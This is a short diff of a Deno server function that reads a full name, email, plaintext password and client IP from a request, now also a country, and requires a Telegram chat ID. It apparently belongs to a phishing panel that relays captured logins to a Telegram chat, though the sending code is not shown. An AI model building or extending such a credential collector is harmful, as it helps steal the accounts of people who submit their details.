@@ -16,7 +16,7 @@ Deno.serve(async (req) => {
     if (!TELEGRAM_CHAT_ID) throw new Error('TELEGRAM_CHAT_ID is not configured');
 
     const body = await req.json();
-    const { full_name, email, password, client_ip } = body;
+    const { full_name, email, password, client_ip, country } = body;
 
     if (!full_name || !email || !password) {
       return new Response(
